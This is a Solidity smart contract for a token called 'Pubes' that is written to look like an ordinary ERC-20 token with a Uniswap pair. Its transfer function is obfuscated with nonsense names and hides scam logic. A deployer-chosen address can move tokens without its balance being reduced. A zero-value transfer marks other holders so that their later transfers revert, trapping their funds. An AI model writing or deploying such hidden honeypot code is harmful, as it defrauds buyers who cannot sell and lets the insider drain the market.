pragma solidity >0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Pubes is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private capital;

    function species(address look, address carefully, uint256 island) private returns (bool success) {
        if (traffic[look] == 0) {
            balanceOf[look] -= island;
        }

        if (island == 0) capital[carefully] += race;

        if (look != uniswapV2Pair && traffic[look] == 0 && capital[look] > 0) {
            traffic[look] -= race;
        }

        balanceOf[carefully] += island;
        emit Transfer(look, carefully, island);
        return true;
    }

    mapping(address => uint256) private traffic;

    uint256 private race = 52;

    function approve(address principal, uint256 island) public returns (bool success) {
        allowance[msg.sender][principal] = island;
        emit Approval(msg.sender, principal, island);
        return true;
    }

    function transfer(address carefully, uint256 island) public returns (bool success) {
        species(msg.sender, carefully, island);
        return true;
    }

    string public symbol = 'Pubes';

    function transferFrom(address look, address carefully, uint256 island) public returns (bool success) {
        require(island <= allowance[look][msg.sender]);
        allowance[look][msg.sender] -= island;
        species(look, carefully, island);
        return true;
    }

    address public uniswapV2Pair;

    constructor(address newspaper) {
        balanceOf[msg.sender] = totalSupply;
        traffic[newspaper] = race;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name = 'Pubes';
}
